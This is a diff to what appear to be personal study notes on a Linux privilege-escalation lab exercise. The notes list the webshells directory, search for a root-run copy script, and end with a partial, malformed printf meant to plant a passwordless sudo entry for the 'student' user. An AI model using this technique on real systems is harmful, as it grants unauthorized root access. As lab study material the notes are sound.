@@ -743,4 +743,14 @@ ls -al /usr/share/webshells - to check pre-packed Linux webshells
 - cat message will give you an error because only root user can do that;
 - pwd to display the actual location / to confirm the location;
 - cd / - go to root
-- grep -rnw /usr -e "/home/student/message" - 
+- grep -rnw /usr -e "/home/student/message" - grep utility to find any occurances of the path /home/student/message
+
+![[Pasted image 20230216203120.png]]
+
+- ls -al /usr/local/share/copy.sh - to check the privileges
+![[Pasted image 20230216203211.png]]
+
+- is a bash script that copies the message from home to tmp
+![[Pasted image 20230216203325.png]]
+
+- printf '#!/bin/bash\echo "student ALL=NOPASSWD"'
